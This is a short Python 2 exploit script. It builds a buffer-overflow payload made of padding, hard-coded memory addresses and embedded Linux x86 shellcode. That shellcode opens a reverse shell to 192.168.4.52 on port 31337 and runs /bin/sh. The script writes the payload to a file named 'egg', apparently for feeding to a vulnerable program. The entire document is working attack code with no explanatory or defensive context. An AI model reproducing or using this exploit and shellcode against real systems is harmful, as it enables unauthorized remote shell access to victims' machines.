#!/usr/bin/env python
 
import struct
 
def off(o):
    return struct.pack('L',o)
 
 
reverseIP = '\xc0\xa8\x04\x34'   #'\xc0\xa8\x01\x0a'
reversePort = '\x7a\x69'
 
 
shellcode = "\xcc\x31\xc0\x31\xdb\x31\xc9\x31\xd2"\
            "\xb0\x66\xb3\x01\x51\x6a\x06\x6a"\
            "\x01\x6a\x02\x89\xe1\xcd\x80\x89"\
            "\xc6\xb0\x66\x31\xdb\xb3\x02\x68"+\
            reverseIP+"\x66\x68"+reversePort+"\x66\x53\xfe"\
            "\xc3\x89\xe1\x6a\x10\x51\x56\x89"\
            "\xe1\xcd\x80\x31\xc9\xb1\x03\xfe"\
            "\xc9\xb0\x3f\xcd\x80\x75\xf8\x31"\
            "\xc0\x52\x68\x6e\x2f\x73\x68\x68"\
            "\x2f\x2f\x62\x69\x89\xe3\x52\x53"\
            "\x89\xe1\x52\x89\xe2\xb0\x0b\xcd"\
            "\x80"
 
 
shellcode_sz = len(shellcode)
 
print 'shellcode sz %d' % shellcode_sz
 
 
ebx =  0x08385908
sc_off = 0x08385908+20
 
padd = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMM'
 
'''          
        +------------+----------------------+         +--------------------+
        |            |                      |         |                    |
        V            |                      |         V                    |
'''
buff = 'aaaa' + off(ebx) + 'aaaaaAAA'+ off(ebx) + shellcode + padd + off(sc_off)  # .. and landed ;)
 
 
print 'buff sz: %s' % len(buff)
open('egg','w').write(buff)
